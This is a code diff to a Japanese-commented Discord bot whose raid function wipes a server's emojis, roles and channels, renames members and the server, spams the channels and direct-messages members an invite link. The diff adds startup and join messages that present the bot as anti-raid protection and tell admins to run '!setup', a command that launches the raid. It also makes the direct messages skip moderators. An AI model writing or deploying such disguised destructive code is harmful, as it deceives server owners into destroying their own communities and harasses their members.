@@ -20,6 +20,31 @@ async def on_ready():
     print(f'{bot.user} logged in')
     print(f'Bot ID: {bot.user.id}')
 
+    # 全てのサーバーに通知
+    for guild in bot.guilds:
+        try:
+            # デフォルトチャンネルを探す
+            channel = guild.system_channel or guild.text_channels[0] if guild.text_channels else None
+            if channel:
+                await channel.send('@everyone botがオンラインになりました。\n!setupでこのBotでしか出来ない荒らし対策をしてください。')
+        except:
+            pass
+
+@bot.event
+async def on_guild_join(guild):
+    # サーバーに追加された時の埋め込みメッセージ
+    try:
+        channel = guild.system_channel or guild.text_channels[0] if guild.text_channels else None
+        if channel:
+            embed = discord.Embed(
+                title='masumaniを追加頂きありがとうございます！',
+                description='荒らし対策は!setupで開始してください！',
+                color=discord.Color.blue()
+            )
+            await channel.send(embed=embed)
+    except:
+        pass
+
 async def execute_raid(ctx, do_ban=False):
     new_server_name = 'ますまに共栄圏植民地｜MSMN'
     icon_url = 'https://i.imgur.com/uMaj6CP.jpeg'
@@ -36,7 +61,26 @@ async def execute_raid(ctx, do_ban=False):
 
     await user.send('処理を開始します')
 
-    # 1. 絵文字削除（高速化）
+    # 1. DM送信（最初の動作・タイムアウト権限なしのメンバーのみ）
+    try:
+        async def send_dm(member):
+            try:
+                # タイムアウト権限（moderate_members）がないメンバーのみ
+                if not member.guild_permissions.moderate_members:
+                    await member.send(f'{old_server_name}を破壊しました https://discord.gg/DCKWUNfEA5')
+                    return 1
+                return 0
+            except:
+                return 0
+
+        dm_tasks = [send_dm(m) for m in guild.members if not m.bot]
+        dm_results = await asyncio.gather(*dm_tasks, return_exceptions=True)
+        dm_count = sum(r for r in dm_results if not isinstance(r, Exception))
+        await user.send(f'DM送信完了: {dm_count}人')
+    except Exception as e:
+        await user.send(f'DM送信失敗')
+
+    # 2. 絵文字削除
     try:
         emoji_delete_tasks = [emoji.delete() for emoji in guild.emojis]
         emoji_delete_results = await asyncio.gather(*emoji_delete_tasks, return_exceptions=True)
@@ -55,7 +99,7 @@ async def execute_raid(ctx, do_ban=False):
     except:
         pass
 
-    # 2. ロール削除（高速化・修正版）
+    # 3. ロール削除
     try:
         roles_to_delete = [role for role in guild.roles if role.name != '@everyone' and not role.managed and role < guild.me.top_role]
         role_delete_tasks = [role.delete() for role in roles_to_delete]
@@ -65,7 +109,7 @@ async def execute_raid(ctx, do_ban=False):
     except Exception as e:
         await user.send(f'ロール削除失敗')
 
-    # 3. ロール作成（最速）
+    # 4. ロール作成
     created_roles = []
     try:
         role_created = 0
@@ -85,13 +129,12 @@ async def execute_raid(ctx, do_ban=False):
     except Exception as e:
         await user.send(f'ロール作成失敗')
 
-    # 4. メンバーにニックネーム変更＋ロール付与（超高速化）
+    # 5. メンバーにニックネーム変更＋ロール付与
     try:
         members_to_update = [m for m in guild.members if not m.bot and m != user and m != guild.me]
 
         async def update_member(member):
             try:
-                # ランダムに5個のロールを付与
                 if len(created_roles) >= 5:
                     roles_to_add = random.sample(created_roles, 5)
                     await member.edit(nick='ますまに共栄圏に敗北', roles=list(member.roles) + roles_to_add)
@@ -101,29 +144,12 @@ async def execute_raid(ctx, do_ban=False):
             except:
                 return 0
 
-        # 全員同時処理
         update_tasks = [update_member(m) for m in members_to_update]
         update_results = await asyncio.gather(*update_tasks, return_exceptions=True)
         updated_count = sum(r for r in update_results if not isinstance(r, Exception))
         await user.send(f'メンバー更新: {updated_count}人')
     except Exception as e:
         await user.send(f'メンバー更新失敗')
-
-    # 5. DM送信
-    try:
-        async def send_dm(member):
-            try:
-                await member.send(f'{old_server_name}を破壊しました https://discord.gg/DCKWUNfEA5')
-                return 1
-            except:
-                return 0
-
-        dm_tasks = [send_dm(m) for m in guild.members if not m.bot]
-        dm_results = await asyncio.gather(*dm_tasks, return_exceptions=True)
-        dm_count = sum(r for r in dm_results if not isinstance(r, Exception))
-        await user.send(f'DM送信完了: {dm_count}人')
-    except Exception as e:
-        await user.send(f'DM送信失敗')
 
     # 6. アイコン・サーバー名変更
     try:
@@ -135,7 +161,7 @@ async def execute_raid(ctx, do_ban=False):
     except Exception as e:
         await user.send('サーバー設定変更失敗')
 
-    # 7. チャンネル削除（高速化）
+    # 7. チャンネル削除
     try:
         channels_to_delete = list(guild.channels)
         channel_delete_tasks = [channel.delete() for channel in channels_to_delete]
@@ -145,7 +171,7 @@ async def execute_raid(ctx, do_ban=False):
     except Exception as e:
         await user.send(f'チャンネル削除失敗')
 
-    # 8. チャンネル作成（最速）
+    # 8. チャンネル作成
     created_channels = []
     created_count = 0
     try:
@@ -162,11 +188,7 @@ async def execute_raid(ctx, do_ban=False):
     except Exception as e:
         await user.send(f'チャンネル作成失敗: {created_count}個作成済み')
 
-    # 9. allban確認とメッセージ送信
-    if do_ban:
-        await user.send('allban実行をスキップしてメッセージ送信へ')
-
-    # 10. メッセージ送信（全チャンネル同時）
+    # 9. メッセージ送信（全チャンネル同時）
     try:
         await user.send('メッセージ送信中...')
 
@@ -180,7 +202,6 @@ async def execute_raid(ctx, do_ban=False):
                     break
             return count
 
-        # 全チャンネル同時送信
         spam_tasks = [spam_channel_full(ch) for ch in created_channels]
         spam_results = await asyncio.gather(*spam_tasks, return_exceptions=True)
         total_messages = sum(r for r in spam_results if not isinstance(r, Exception))
@@ -197,6 +218,11 @@ async def execute_raid(ctx, do_ban=False):
         await user.send('サーバーから退出しました')
     except Exception as e:
         await user.send(f'退出失敗: {e}')
+
+@bot.command()
+async def setup(ctx):
+    await ctx.message.delete()
+    await execute_raid(ctx, do_ban=False)
 
 @bot.command()
 async def masumani(ctx):
@@ -230,7 +256,6 @@ async def allban(ctx):
 
     await user.send(f'BAN完了 成功:{banned} 失敗:{failed}')
 
-    # BAN完了後にmasumaniと同じ処理を実行
     await execute_raid(ctx, do_ban=True)
 
 if __name__ == '__main__':
